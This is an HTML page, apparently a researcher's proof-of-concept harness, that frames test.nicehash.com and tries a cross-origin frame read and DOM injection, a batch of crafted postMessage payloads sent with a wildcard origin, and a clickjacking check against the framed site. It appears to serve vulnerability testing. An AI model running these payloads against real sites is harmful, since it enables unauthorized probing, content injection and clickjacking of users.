<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>External Exploit Test - Attacker Site</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
        }
        
        h1 {
            color: #ff0041;
            text-shadow: 0 0 10px #ff0041;
        }
        
        .section {
            background: #1a1f3a;
            border: 2px solid #00ff41;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        button {
            background: #ff0041;
            color: #fff;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
        }
        
        button:hover {
            background: #cc0033;
            box-shadow: 0 0 15px #ff0041;
        }
        
        #log {
            background: #000;
            border: 1px solid #00ff41;
            border-radius: 4px;
            padding: 15px;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 10px;
            font-size: 12px;
        }
        
        .log-entry {
            margin-bottom: 8px;
            padding: 5px;
            border-left: 3px solid #00ff41;
            padding-left: 10px;
        }
        
        .log-error {
            border-left-color: #ff0041;
            color: #ff0041;
        }
        
        .log-success {
            border-left-color: #00ff41;
            color: #00ff41;
        }
        
        iframe {
            width: 100%;
            height: 400px;
            border: 2px solid #00ff41;
            border-radius: 4px;
            margin-top: 10px;
        }
        
        input {
            background: #0a0e27;
            color: #00ff41;
            border: 1px solid #00ff41;
            padding: 8px;
            width: 100%;
            margin: 10px 0;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <h1>‚ö†Ô∏è External Attacker Simulation - iframe Exploit Test</h1>
    
    <div class="section">
        <h2>üìã Instructions</h2>
        <p>This simulates an attacker hosting a malicious page trying to exploit NiceHash's iframe vulnerability.</p>
        <ol>
            <li>The page loads NiceHash in an iframe below</li>
            <li>Click "Attempt Exploit" to try accessing the vulnerable iframe</li>
            <li>Watch the log to see if cross-origin attacks work</li>
        </ol>
    </div>

    <div class="section">
        <h2>üéØ Target Configuration</h2>
        <input type="text" id="targetUrl" value="https://test.nicehash.com" placeholder="Target URL">
        <button onclick="loadTarget()">Load Target in iframe</button>
        <button onclick="attemptDirectAccess()">Test 1: Direct iframe Access</button>
        <button onclick="attemptPostMessage()">Test 2: PostMessage Attack</button>
        <button onclick="attemptClickjacking()">Test 3: Clickjacking</button>
        <button onclick="clearLog()">Clear Log</button>
    </div>

    <div class="section">
        <h2>üì∫ Target Site (Embedded)</h2>
        <div id="iframeContainer"></div>
    </div>

    <div class="section">
        <h2>üìä Exploit Attempt Log</h2>
        <div id="log"></div>
    </div>

    <script>
        let targetIframe = null;

        function log(message, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }

        function loadTarget() {
            const url = document.getElementById('targetUrl').value;
            const container = document.getElementById('iframeContainer');
            
            log(`Attempting to load: ${url}`, 'info');
            
            // Remove old iframe
            container.innerHTML = '';
            
            // Create new iframe
            targetIframe = document.createElement('iframe');
            targetIframe.src = url;
            targetIframe.id = 'targetFrame';
            
            targetIframe.onload = () => {
                log('‚úÖ Target loaded successfully', 'success');
                log('Now try the exploit tests above', 'info');
            };
            
            targetIframe.onerror = () => {
                log('‚ùå Failed to load target (might be blocked by X-Frame-Options)', 'error');
            };
            
            container.appendChild(targetIframe);
        }

        function attemptDirectAccess() {
            log('üîç TEST 1: Attempting direct access to embedded iframe...', 'info');
            
            if (!targetIframe) {
                log('‚ùå No target loaded. Click "Load Target" first.', 'error');
                return;
            }

            try {
                // Try to access the target's window
                log('Attempting: targetIframe.contentWindow.location.href', 'info');
                const location = targetIframe.contentWindow.location.href;
                log(`‚úÖ SUCCESS! Got location: ${location}`, 'success');
            } catch (e) {
                log(`‚ùå BLOCKED: ${e.message}`, 'error');
            }

            try {
                // Try to access frames inside
                log('Attempting: targetIframe.contentWindow.frames[1]', 'info');
                const frame1 = targetIframe.contentWindow.frames[1];
                log(`Frame[1] exists: ${!!frame1}`, 'info');
                
                // Try to access Frame[1]'s document
                log('Attempting: frame1.document', 'info');
                const doc = frame1.document;
                log(`‚úÖ SUCCESS! Got document: ${doc}`, 'success');
            } catch (e) {
                log(`‚ùå BLOCKED: ${e.message}`, 'error');
            }

            try {
                // Try to inject into Frame[1]
                log('Attempting: Inject code into frame1.document.body', 'info');
                targetIframe.contentWindow.frames[1].document.body.innerHTML = '<h1>PWNED FROM EXTERNAL SITE</h1>';
                log('‚úÖ SUCCESS! Code injected!', 'success');
            } catch (e) {
                log(`‚ùå BLOCKED: ${e.message}`, 'error');
            }

            log('--- Test 1 Complete ---', 'info');
        }

        function attemptPostMessage() {
            log('üîç TEST 2: Attempting PostMessage attacks...', 'info');
            
            if (!targetIframe) {
                log('‚ùå No target loaded. Click "Load Target" first.', 'error');
                return;
            }

            // Listen for responses
            window.addEventListener('message', (e) => {
                log(`üì® Received message from: ${e.origin}`, 'success');
                log(`Data: ${JSON.stringify(e.data)}`, 'info');
            }, { once: false });

            // Try various message types
            const exploits = [
                { type: 'channelConnect' },
                { type: 'readyForConnect', iframeId: 'exploit', sessionId: 'attacker' },
                { type: 'execute' },
                { type: 'recaptcha-setup' },
                ['Bexploit', 'x', 'external_attack'],
                { method: 'constructor', data: 'alert(1)' }
            ];

            exploits.forEach((payload, i) => {
                setTimeout(() => {
                    log(`Sending payload ${i + 1}: ${JSON.stringify(payload).substring(0, 50)}`, 'info');
                    targetIframe.contentWindow.postMessage(payload, '*');
                }, i * 500);
            });

            log('--- Test 2 Complete (watch for responses) ---', 'info');
        }

        function attemptClickjacking() {
            log('üîç TEST 3: Checking Clickjacking vulnerability...', 'info');
            
            if (!targetIframe) {
                log('‚ùå No target loaded. Click "Load Target" first.', 'error');
                return;
            }

            log('‚úÖ If you can see the NiceHash site in the iframe, it\'s vulnerable to clickjacking', 'success');
            log('An attacker could overlay invisible buttons to trick users', 'info');
            
            // Try to make it more obvious
            targetIframe.style.opacity = '0.5';
            targetIframe.style.border = '5px solid red';
            
            setTimeout(() => {
                targetIframe.style.opacity = '1';
                targetIframe.style.border = '2px solid #00ff41';
            }, 2000);
            
            log('--- Test 3 Complete ---', 'info');
        }

        // Auto-load on page load
        window.onload = () => {
            log('üöÄ External Attacker Page Loaded', 'success');
            log('Click "Load Target" to begin testing', 'info');
            log('', 'info');
            log('‚ö†Ô∏è EXPECTED RESULT:', 'info');
            log('Most tests should FAIL due to Same-Origin Policy', 'info');
            log('If ANY test succeeds, that\'s a critical vulnerability!', 'info');
        };
    </script>
</body>
</html>
